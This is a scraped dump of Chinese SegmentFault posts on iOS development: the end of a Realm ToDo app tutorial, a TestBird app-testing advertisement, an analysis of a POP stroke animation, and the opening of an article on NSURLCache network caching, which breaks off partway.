<pre><code>
uiRealm.write({ () -&gt; Void in
    task.isCompleted = true
})
</code></pre>
<h3>使用主键（Primary Key）</h3>
<p>Realm 支持将某个 string 或 int 类型的属性设置为主键。当使用 <code>add()</code> 方法来创建 Realm 对象时，如果有相同主键的对象存在，就会更新这个对象的值。下面是示例代码：</p>
<pre><code>
let user = User()
user.firstName = ""John""
user.lastName = ""Smith""
user.email = ""example@example.com""
user.id = 1
// 更新 id 是 1 的用户
realm.write {
            realm.add(user, update: true)
        }
</code></pre>
<p>这里的 id 属性为主键。如果 id 为 1 的用户存在，Realm 会更新相应的对象。如果不存在，Realm 将会把该对象存入数据库中。</p>
<h3>使用 KVC（Key-Value Coding）</h3>
<p>如果你是 iOS 开发的老手，那么对 Key-Value Coding 肯定不会陌生。Realm 的类型，像是 Object、Results 和 List，都可以使用 Key-Value Coding。该特性可以帮助你在运行时设置或更新属性值。另外一个在 List 和 Results 中支持 KVC 的好处是，可以在无需遍历每个对象的情况下，批量更新对象数据。这么说你可能不是很理解，我们来看个例子：</p>
<pre><code>
let tasks = uiRealm.objects(Task)
uiRealm.write { () -&gt; Void in
    tasks.setValue(true, forKeyPath: ""isCompleted"")
}
</code></pre>
<p>在上面的代码中，使用查询语句来请求所有的 Task 对象，之后将所有得到的对象的 <code>isCompleted</code> 属性设置为 true。可以看出，将 Realm 中的所有 tasks 标记为已完成，仅仅只用了一行代码。</p>
<p>让我们回过头来看看我们的 ToDo 应用。如果仔细观察 <code>displayAlertToAddTaskList</code> 方法，你会看到如下代码片段：</p>
<pre><code>
  // 更新状态
 uiRealm.write({ () -&gt; Void in
           updatedList.name = listName!
           self.readTasksAndUpdateUI()
 })
</code></pre>
<p>当用户遍历列表名称的时候，上面的代码会被调用。通过设置 name 属性的方式，就更新了数据库中的内容。</p>
<h2>显示任务项</h2>
<p>我们已经一起看过了 <code>TaskListViewController</code> 的绝大部分代码。现在让我们打开 <code>TasksViewController</code> 来看看，这个视图控制器用来显示任务清单中的任务项。视图控制器拥有一个 UITableView, 该视图有两个 section：完成的任务和未完成的任务。在 <code>TasksViewController</code> 中，有如下属性：</p>
<pre><code>
var selectedList : TaskList!
var openTasks : Results&lt;Task&gt;!
var completedTasks : Results&lt;Task&gt;!
</code></pre>
<p><code>selectedList</code> 用来存储 <code>TaskListsViewController</code> 传递过来的选中的任务列表。为了将完成和未完成的任务分开，声明了两个属性，<code>openTasks</code> 和 <code>completedTasks</code>。为了过滤出不同的任务完成状态，我们将使用 Realm 的方法 <code>filter()</code>。在解释该函数如何工作之前，让我们先来看看如何在代码中使用它：</p>
<pre><code>
func readTasksAndUpateUI(){
    
    completedTasks = self.selectedList.tasks.filter(""isCompleted = true"")
    openTasks = self.selectedList.tasks.filter(""isCompleted = false"")
    
    self.tasksTableView.reloadData()
}
</code></pre>
<p>在上面的方法中，我们使用 <code>filter</code> 方法来过滤 <code>results</code>。Realm 提供了 <code>filter()</code> 方法来过滤数据。该方法可以被 List、Result 和 Object 对象调用。方法会返回过满足滤条件参数的特定对象。你可以把 <code>filter</code> 当做 <code>NSPredicate</code>。基本上来说，你可以认为这两者差不多。就像上面的代码一样，你同样可以使用 string 作为参数创建一个 <code>NSPredicate</code> 对象，并把它作为参数传给 <code>filter</code> 方法。</p>
<p>让我们来看另外一个例子：</p>
<pre><code>
// 使用断言字符串
var redCars = realm.objects(Car).filter(""color = 'red' AND name BEGINSWITH 'BMW'"")
 
// 使用 NSPredicate
let aPredicate = NSPredicate(format: ""color = %@ AND name BEGINSWITH %@"", ""red"", ""BMW"")
redCars = realm.objects(Car).filter(aPredicate)
</code></pre>
<p>在上面的代码中，我们使用 <code>filter</code> 方法来过滤 <code>color</code> 为 red，并且 <code>name</code> 以 ""BMW"" 开头的对象。第一行代码使用 string 作为参数来进行过滤。另外，你也可以使用 NSPredicate 获得同样的效果。下面的表格总结了 filter 方法的大部分常用操作：</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/realm-database-info-1024x675.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<h2>排序</h2>
<p>既然我们谈到了 Realm 数据库的基本操作，在本教程结束之前，我还想给大家介绍另外一个特性。排序功能，这是 Realm 提供了另一个特别有用的特性。对于 List 和 Result 对象，你可以调用方法 <code>sorted（「排序标准」）</code> 来将一组数据进行排序。让我们来看看如何在任务列表中使用该方法让任务列表以字母表或者创建时间先后顺序排序。首先，在 UI 中，我们增加了一个 segment control，将会根据选择的情况来进行对应的排序。</p>
<p><span class=""img-wrap""><img data-src=""http://www.appcoda.com/wp-content/uploads/2015/10/Simulator-Screen-Shot-Oct-24-2015-8.47.06-PM-576x1024.png"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt="""" title=""""></span></p>
<p>根据不同的选择来进行排序，代码逻辑如下：</p>
<pre><code>
@IBAction func didSelectSortCriteria(sender: UISegmentedControl) {
        
        if sender.selectedSegmentIndex == 0{
            
            // 按 A-Z 排序
            self.lists = self.lists.sorted(""name"")
        }
        else{
            // 按日期排序
            self.lists = self.lists.sorted(""createdAt"", ascending:false)
        }
        self.taskListsTableView.reloadData()
    }
</code></pre>
<h2>总结</h2>
<p>Realm 是一个非常简单易用，直观的本地数据库解决方案。Realm 提供了很好的可扩展性，只用很少的几行代码就可完成操作。对于大部分的应用甚至是游戏来说，我觉得如果需要使用数据库的话，Realm 值得尝试。</p>
<h2>下一步？</h2>
<p>学习了本教程，你应该可以在项目中使用 Realm 来进行增删改查等基本的操作。Realm 还具有一些高阶特性，值得深入学习。最好的学习资料就是 Realm 网站的官方文档，Realm 的小伙伴把文档写得非常赞！</p>
<p>如果想要教程 ToDo 应用的的完整代码，你可以在<a href=""https://github.com/hossamghareeb/realmtasks"" rel=""nofollow noreferrer"">这里下载</a>。</p>
<p>如果对代码有任何的问题，都欢迎留言反馈，我们会很乐意帮助到您。</p>
<blockquote><p>本文由 SwiftGG 翻译组翻译，已经获得作者翻译授权，最新文章请访问 <a href=""http://swift.gg"" rel=""nofollow noreferrer""></a><a href=""http://swift.gg"" rel=""nofollow noreferrer"">http://swift.gg</a>。</p></blockquote>

                ", 使用 Realm 和 Swift 创建 ToDo 应用,1531972060,133,1,489,1,1,https://segmentfault.com/a/1190000004369691
120,1,0,6,"
                    
<h2>前言：</h2>
<p>如今缺乏专业的应用测试，上线将由通途变天堑。一般来讲，开发者没有完成专业测试的条件，因为这需要极大的硬件与人力成本。在共享经济与协作开放的时代，开发者可以尝试来进行应用测试，继而发现应用的不足之处，及时完善产品质量，加速上线审核。让专业的人做专业的事，别让莫名其妙的bug拖延你宝贵的上线时间。Testbird有最专业的测试团队可以为您定制专属的APP测试服务，您所需要做的仅仅只有拖拽上传APK。<br><a href=""https://dt.testbird.com/sign_up/?i18n=zh-cn&amp;cl=DNgwzY&amp;invite=YjX97B"" rel=""nofollow noreferrer""><strong>Testbird官方注册地址</strong></a><strong>（现在注册完善资料即可免费体验兼容性测试TOP50机型）</strong></p>
<h2>远程终端租用</h2>
<ul>
<li><p>创新产品，远程操作云端手机，远程真机调试程序，修复bug，观察用户行为</p></li>
<li><p>节省成本：避免终端购置成本，2000款终端，机型齐全，可自由选择</p></li>
<li><p>自由度高：在租用期间，客户可以对手机进行各种操作。</p></li>
<li><p>速度快：客户独占手机，无需等待排队，比客户自行购机再现场测试还要快</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuM4"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>APP真机兼容性测试</h2>
<ul>
<li><p>明星产品，测试应用与终端适配性，已服务6000家合作伙伴</p></li>
<li><p>覆盖广泛：2000款机型，覆盖98%的主流机型和95%的目标用户</p></li>
<li><p>深度高效：能深入内部功能进行测试，24小时快速完成测试</p></li>
<li><p>报告精细：近200页详尽专业APP测试报告，丰富的日志和截图详细记录测试全程</p></li>
<li><p>定位准确：平均每款应用发现65个问题，日志和截图联动分析准确定位bug</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuM2"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>自动化脚本录制回放</h2>
<ul>
<li><p>最强大的APP自动化测试脚本录制和终端回放工具</p></li>
<li><p>验证特定场景的功能流程</p></li>
<li><p>支持多种操作行为，自动生成测试脚本</p></li>
<li><p>一次录制可在多款终端运行回放</p></li>
<li><p>支持脚本用例管理功能</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuM1"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>网络模拟测试</h2>
<ul>
<li><p>优势产品，模拟用户真实网络环境，测试不同网络下的用户体验</p></li>
<li><p>效果真实：真人测试，可模拟2G/3G/4G/WIFI等不同网络环境</p></li>
<li><p>经验丰富：源自华为测试团队，对移动网络环境有深刻理解</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuM0"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>真人压力测试</h2>
<ul>
<li><p>领先级产品，千人同时在线，测试服务器端和终端性能</p></li>
<li><p>真实体验：真实用户，真实现网，避免机器人测试造成的性能体验不真实</p></li>
<li><p>专业用户：40000名高质量用户，分布各地，带宽、服务器参数和客户端感受等问题生动呈现</p></li>
<li><p>精准量化：人员循序导入，精准量化服务器和客户端的问题，不以冲爆服务器为主</p></li>
<li><p>周密操作：事前详细规划模拟，事中精密控制引导，事后报告精细全面</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuMZ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>真人体验测试</h2>
<ul>
<li><p>专业产品，40000名真实用户，测试UI和主观使用体验</p></li>
<li><p>用户广泛：40000+玩家来自各地，5大类、25小类详尽玩家属性，精准定位目标玩家</p></li>
<li><p>评估专业：吸引力、留存力、付费力三大体系28条维度分析，历经200家合作伙伴验证认可</p></li>
<li><p>管理精细：严格的反作弊和截图认证机制，测试用户采用信用评级，优胜劣汰</p></li>
<li><p>可定制化：客户可自选玩家，自定义测试任务，全程查看测试进度</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuMW"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<h2>线上监控服务</h2>
<ul>
<li><p>上线后的用户行为、用户转化监测分析</p></li>
<li><p>上线后的应用崩溃分析、应用性能分析</p></li>
</ul>
<p><span class=""img-wrap""><img data-src=""/img/bVsuMY"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>

                ", APP测试的新篇章,1531972062,499,1,442,1,1,https://segmentfault.com/a/1190000004369211
121,1,0,6,"
                    
<ol>
<li><p>本教程源码<a href=""https://github.com/YouXianMing/Animations"" rel=""nofollow noreferrer"">Animations</a> 作者 <a href=""https://github.com/YouXianMing"" rel=""nofollow noreferrer"">YouXianMing</a>,建议配合源码项目食用</p></li>
<li><p>Facebook pop动画框架简易教程请移步 <a href=""http://geeklu.com/2014/05/facebook-pop-usage/"" rel=""nofollow noreferrer"">Facebook Pop 使用指南</a></p></li>
<li><p><a href=""http://www.cocoachina.com/bbs/read.php?tid=84461"" rel=""nofollow noreferrer"">CoreAnimation不简易教程</a></p></li>
<li><p>如果不想看第三条的教程，也要弄明白CALayer的隐式动画，否则看本文会疑惑，请移步<a href=""http://www.cnblogs.com/sell/archive/2013/02/07/2908804.html"" rel=""nofollow noreferrer"">CALayer的隐式动画和显式动画</a></p></li>
</ol>
<h2>CAMediaTimingFunction</h2>
<p>今天我们来看一下研究一下<code>CAMediaTimingFunction</code>类，它是一个动画的时间线控制类，他所控制的时间线，可以是是一条直线、曲线或者折线，如下:</p>
<p><span class=""img-wrap""><img data-src=""/img/bVstNN"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""poster.jpg"" title=""poster.jpg""></span></p>
<p>这是用一个开源软件生成的<code>CAMediaTimingFunction</code>，软件地址是<a href=""https://github.com/keefo/CATweaker"" rel=""nofollow noreferrer"">keefo/CATweaker</a></p>
<p>可见，一般自定义的<code>CAMediaTimingFunction</code>通过调用</p>
<pre><code>/* Creates a timing function modelled on a cubic Bezier curve. The end
 * points of the curve are at (0,0) and (1,1), the two points 'c1' and
 * 'c2' defined by the class instance are the control points. Thus the
 * points defining the Bezier curve are: '[(0,0), c1, c2, (1,1)]' */

+ (instancetype)functionWithControlPoints:(float)c1x :(float)c1y :(float)c2x :(float)c2y;

- (instancetype)initWithControlPoints:(float)c1x :(float)c1y :(float)c2x :(float)c2y;</code></pre>
<p>两个方法，传入四个位置点参数生成。 注：上图中XY轴区间都是[0,1];</p>
<p>这个类，在什么地方用到呢？</p>
<ol>
<li><p>CALayer的隐式和显式动画，<code>CATransaction</code>有<code>animationTimingFunction</code>设置。</p></li>
<li><p><code>CAKeyframeAnimation</code>有相关设置。</p></li>
<li><p><code>CABasicAnimation</code>是线性的动画，一条直线。</p></li>
<li><p><code>CASpringAnimation</code>弹簧动画是也是有一个特殊的走向，属于<code>CAMediaTimingFunction</code>的特殊封装。</p></li>
<li><p><code>POP</code>也借用了<code>CAMediaTimingFunction</code>类实现非线性动画。</p></li>
</ol>
<p>下面这个网站可以在线调试，<a href=""http://cubic-bezier.com/#.86,.02,.46,1.14"" rel=""nofollow noreferrer"">cubic-bezier</a>，虽然是给CSS工程师用的，但是通用的。<br><span class=""img-wrap""><img data-src=""/img/bVstRi"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""图片描述"" title=""图片描述""></span></p>
<p>上图中，蓝色的方块的运动就是线性的，红色方块是非线性的。</p>
<p>iOS7开始，iOS系统大量引入了非线性动画。</p>
<p><span class=""img-wrap""><img data-src=""/img/bVstR9"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""0-example-2.gif"" title=""0-example-2.gif""></span><br><span class=""img-wrap""><img data-src=""/img/bVstSc"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""0-example-1.gif"" title=""0-example-1.gif""></span></p>
<p>上图引用自 <a href=""http://www.renfei.org/blog/ios-8-spring-animation.html"" rel=""nofollow noreferrer"">使用 iOS 8 Spring Animation API 创建动画</a></p>
<h2>Spring动画</h2>
<p>弹簧（Spring）动画是一种特殊曲线的非线性动画，因为用的地方太多，所以无论是CoreAnimation还是POP，都将其进行了封装<code>CASpringAnimation</code>,<code>POPSpringAnimation</code>。</p>
<p>两者有一点区别，参考源码中的<code>CASpringAnimation</code>和<code>POP－Spring动画参数详解</code><br><span class=""img-wrap""><img data-src=""/img/bVstTb"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""POPSpringAnimation"" title=""POPSpringAnimation""></span></p>
<h2>POP-Stroke动画</h2>
<p><span class=""img-wrap""><img data-src=""/img/bVstMF"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""687474703a2f2f696d61676573323031352e636e626c6f67732e636f6d2f626c6f672f3630373534322f3230313531312f3630373534322d32303135313131373131333135333337342d313337303739333939372e676966"" title=""687474703a2f2f696d61676573323031352e636e626c6f67732e636f6d2f626c6f672f3630373534322f3230313531312f3630373534322d32303135313131373131333135333337342d313337303739333939372e676966""></span></p>
<p>今天我们来分析一下<code>POP-Stroke动画</code>的源代码，首先interface中声明了一个<code>CAShapeLayer</code>是中心的圆，<code>timer</code>是一个定时器。这个GCDTimer是作者对GCD进行的一层对象化封装。</p>
<pre><code>@interface PopStrokeController ()

@property (nonatomic, strong) CAShapeLayer  *circleShape;
@property (nonatomic, strong) GCDTimer      *timer;

@end</code></pre>
<p>实现的思路是，定时改变<code>CAShapeLayer</code>的startStoke和endStoke属性，改变圆的绘制弧度，使用POP的Spring动画控制其改变数值。</p>
<pre><code>- (void)setup {
    
    [super setup];
    
    self.circleShape           = [CAShapeLayer layer];
    self.circleShape.strokeEnd = 0.f;
    self.circleShape.lineCap   = kCALineCapRound;
    
    StrokeCircleLayerConfigure *config = [StrokeCircleLayerConfigure new];
    config.lineWidth                   = 4.f;
    config.startAngle                  = 0;
    config.endAngle                    = M_PI * 2;
    config.radius                      = 55.f;
    config.circleCenter                = self.contentView.middlePoint;
    config.strokeColor                 = [UIColor cyanColor];
    [config configCAShapeLayer:self.circleShape];   
    [self.contentView.layer addSublayer:self.circleShape];
    
    _timer = [[GCDTimer alloc] initInQueue:[GCDQueue mainQueue]];

    [_timer event:^{
        
        CGFloat value1 = arc4random() % 101 / 100.f;
        CGFloat value2 = arc4random() % 101 / 100.f;
        
        POPSpringAnimation *strokeAnimationEnd = [POPSpringAnimation animationWithPropertyNamed:kPOPShapeLayerStrokeEnd];
        strokeAnimationEnd.toValue             = @(value1 &gt; value2 ? value1 : value2);
        strokeAnimationEnd.springBounciness    = 12.f;
        
        POPSpringAnimation *strokeAnimationStart = [POPSpringAnimation animationWithPropertyNamed:kPOPShapeLayerStrokeStart];
        strokeAnimationStart.toValue             = @(value1 &lt; value2 ? value1 : value2);
        strokeAnimationStart.springBounciness    = 12.f;
        
        POPBasicAnimation *strokeAnimationColor  = [POPBasicAnimation animationWithPropertyNamed:kPOPShapeLayerStrokeColor];
        strokeAnimationColor.toValue             = (__bridge id)([self randomColor].CGColor);
        
        [self.circleShape pop_addAnimation:strokeAnimationEnd forKey:@""layerStrokeAnimation""];
        [self.circleShape pop_addAnimation:strokeAnimationStart forKey:@""layerStrokeAnimation1""];
        [self.circleShape pop_addAnimation:strokeAnimationColor forKey:@""layerStrokeAnimation2""];
        
    } timeIntervalWithSecs:1];
    
    [_timer start];
}

- (UIColor *)randomColor {

    return [UIColor colorWithRed:arc4random() % 101 / 100.f
                           green:arc4random() % 101 / 100.f
                            blue:arc4random() % 101 / 100.f
                           alpha:1];
}</code></pre>
<p>我们可以看到，POP支持了CALayer的所有动画属性，上面代码中用的</p>
<pre><code>NSString * const kPOPShapeLayerStrokeStart = @""shapeLayer.strokeStart"";
NSString * const kPOPShapeLayerStrokeEnd = @""shapeLayer.strokeEnd"";
NSString * const kPOPShapeLayerStrokeColor = @""shapeLayer.strokeColor"";</code></pre>
<p>分别对应CAShapeLayer的绘制颜色，起始比例区间。</p>
<pre><code>/* The color to fill the path's stroked outline, or nil for no stroking.
 * Defaults to nil. Animatable. */

@property(nullable) CGColorRef strokeColor;

/* These values define the subregion of the path used to draw the
 * stroked outline. The values must be in the range [0,1] with zero
 * representing the start of the path and one the end. Values in
 * between zero and one are interpolated linearly along the path
 * length. strokeStart defaults to zero and strokeEnd to one. Both are
 * animatable. */

@property CGFloat strokeStart;
@property CGFloat strokeEnd;</code></pre>
<p>然后通过生成随机数的方式，用定时器定时改变，同时随机改变了颜色。所以总共使用了三个Spring动画。</p>
<p>相同原理的Demo还有<code>Easing-圆环动画</code></p>
<p><span class=""img-wrap""><img data-src=""/img/bVstMJ"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""687474703a2f2f696d61676573323031352e636e626c6f67732e636f6d2f626c6f672f3630373534322f3230313531312f3630373534322d32303135313132343130353630383039332d3936373031303436332e676966"" title=""687474703a2f2f696d61676573323031352e636e626c6f67732e636f6d2f626c6f672f3630373534322f3230313531312f3630373534322d32303135313132343130353630383039332d3936373031303436332e676966""></span></p>
<p>只是这例子中用了作者自己封装的<code>YXEasing</code>类。</p>
<h2>总结</h2>
<p>非线性动画对于要精益求精交互工程师来说，是一把剑利的刃。放在iOS5时代可能因为设备性能等问题，还是把双刃剑，但现在来说，已经完全是提升APP动效交互的利器了。</p>
<p>相关阅读: <a href=""http://easings.net/zh-cn"" rel=""nofollow noreferrer"">缓动函数速查表</a></p>

                ", Animations开源动效分析（二）POP-Stroke动画,1531972063,352,1,574,1,1,https://segmentfault.com/a/1190000004365988
122,1,0,6,"
                    
<h2>目录</h2>
<ol>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#%E5%BD%93%E6%88%91%E4%BB%AC%E5%9C%A8%E8%B0%88%E8%AE%BA%E7%BC%93%E5%AD%98%E7%9A%84%E6%97%B6%E5%80%99%E6%88%91%E4%BB%AC%E5%9C%A8%E8%B0%88%E8%AE%BA%E4%BB%80%E4%B9%88"" rel=""nofollow noreferrer"">当我们在谈论缓存的时候，我们在谈论什么？</a></p></li>
<li>
<p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#get%E7%BD%91%E7%BB%9C%E8%AF%B7%E6%B1%82%E7%BC%93%E5%AD%98"" rel=""nofollow noreferrer"">GET网络请求缓存</a></p>
<ol>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#80%E7%9A%84%E7%BC%93%E5%AD%98%E9%9C%80%E6%B1%82%E4%B8%A4%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%B0%B1%E5%8F%AF%E6%BB%A1%E8%B6%B3"" rel=""nofollow noreferrer"">80%的缓存需求：两行代码就可满足</a></p></li>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#%E6%8E%A7%E5%88%B6%E7%BC%93%E5%AD%98%E7%9A%84%E6%9C%89%E6%95%88%E6%80%A7"" rel=""nofollow noreferrer"">控制缓存的有效性</a></p></li>
<li>
<p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E5%80%9F%E5%8A%A9etag%E6%88%96last-modified%E5%88%A4%E6%96%AD%E6%96%87%E4%BB%B6%E7%BC%93%E5%AD%98%E6%98%AF%E5%90%A6%E6%9C%89%E6%95%88"" rel=""nofollow noreferrer"">文件缓存：借助ETag或Last-Modified判断文件缓存是否有效</a></p>
<ol>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#last-modified"" rel=""nofollow noreferrer"">Last-Modified</a></p></li>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#etag"" rel=""nofollow noreferrer"">ETag</a></p></li>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#%E6%80%BB%E7%BB%93"" rel=""nofollow noreferrer"">总结</a></p></li>
</ol>
</li>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#%E4%B8%80%E8%88%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B%E5%80%9F%E5%8A%A9-last-modified-%E4%B8%8E--etag-%E8%BF%9B%E8%A1%8C%E7%BC%93%E5%AD%98"" rel=""nofollow noreferrer"">一般数据类型借助 Last-Modified 与 ETag 进行缓存</a></p></li>
</ol>
</li>
<li><p><a href=""https://github.com/ChenYilong/ParseSourceCodeStudy/blob/master/02_Parse%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E4%B8%8E%E7%A6%BB%E7%BA%BF%E5%AD%98%E5%82%A8/iOS%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E6%89%AB%E7%9B%B2%E7%AF%87.md#%E5%89%A9%E4%B8%8B20%E7%9A%84%E7%BD%91%E7%BB%9C%E7%BC%93%E5%AD%98%E9%9C%80%E6%B1%82"" rel=""nofollow noreferrer"">剩下20%的网络缓存需求--真的有NSURLCache 不能满足的需求？</a></p></li>
</ol>
<p>由于微信、QQ、微博、这类的应用使用缓存很“重”，使一般的用户也对缓存也非常习惯。缓存已然成为必备。</p>
<blockquote><p>缓存的目的的以空间换时间</p></blockquote>
<p>这句话在动辄就是 300M、600M 的大应用上，得到了很好的诠释。但能有缓存意识的公司，还在少数。</p>
<blockquote><p>只有你真正感受到痛的时候，你才会考虑使用缓存。</p></blockquote>
<p>这个痛可能是：</p>
<p>服务器压力、客户端网络优化、用户体验等等。</p>
<h2>当我们在谈论缓存的时候，我们在谈论什么？</h2>
<p>我们今天将站在小白用户的角度，给缓存这个概念进行重新的定义。</p>
<p>缓存有不同的分类方法：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000006766486"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""enter image description here"" title=""enter image description here""></span></p>
<p>这里所指的缓存，是一个宽泛的概念。</p>
<p>我们这里主要按照功能进行划分：</p>
<p><span class=""img-wrap""><img data-src=""/img/remote/1460000004847007"" src=""https://static.segmentfault.com/v-5b4c6359/global/img/squares.svg"" alt=""enter image description here"" title=""enter image description here""></span></p>
<table>
<thead><tr>
<th> </th>
<th align=""left"">第一种</th>
<th align=""left"">第二种</th>
</tr></thead>
<tbody>
<tr>
<td>目的</td>
<td align=""left"">优化型缓存</td>
<td align=""left"">功能型缓存</td>
</tr>
<tr>
<td>具体描述</td>
<td align=""left"">出于优化考虑：服务器压力、用户体验、为用户剩流量等等。同时优化型缓存也有内存缓存和磁盘缓存之分。</td>
<td align=""left"">App离线也能查看，出于功能考虑，属于存储范畴</td>
</tr>
<tr>
<td>常见概念</td>
<td align=""left"">GET网络请求缓存、WEB缓存</td>
<td align=""left"">离线存储</td>
</tr>
<tr>
<td>典型应用</td>
<td align=""left"">微信首页的会话列表、微信头像、朋友圈、网易新闻新闻列表、</td>
<td align=""left"">微信聊天记录、</td>
</tr>
<tr>
<td>Parse对应的类</td>
<td align=""left"">PFCachedQueryController</td>
<td align=""left"">PFOfflineStore</td>
</tr>
</tbody>
</table>
<p>重度使用缓存的App：  微信、微博、网易新闻、携程、去哪儿等等。</p>
<h2>GET网络请求缓存</h2>
<h3>概述</h3>
<p>首先要知道，POST请求不能被缓存，只有 GET 请求能被缓存。因为从数学的角度来讲，GET 的结果是 <code>幂等</code> 的，就好像字典里的 key 与 value 就是<code>幂等</code>的，而 POST 不 <code>幂等</code> 。缓存的思路就是将查询的参数组成的值作为 key ，对应结果作为value。从这个意义上说，一个文件的资源链接，也叫 GET 请求，下文也会这样看待。</p>
<h3>80%的缓存需求：两行代码就可满足</h3>
<p>设置缓存只需要三个步骤：</p>
<p>第一个步骤：请使用 GET 请求。</p>
<p>第二个步骤：如果你已经使用 了 GET 请求，iOS 系统 SDK 已经帮你做好了缓存。你需要的仅仅是设置下内存缓存大小、磁盘缓存大小、以及缓存路径。甚至这两行代码不设置也是可以的，会有一个默认值。代码如下：</p>
<pre><code class=""objc"">NSURLCache *urlCache = [[NSURLCache alloc] initWithMemoryCapacity:4 * 1024 * 1024 diskCapacity:20 * 1024 * 1024 diskPath:nil];
[NSURLCache setSharedURLCache:urlCache];</code></pre>
<p>第三个步骤：没有第三步！</p>
<p>你只要设置了这两行代码，基本就可满足80%的缓存需求。AFNetworking 的作者 Mattt曾经说过：</p>
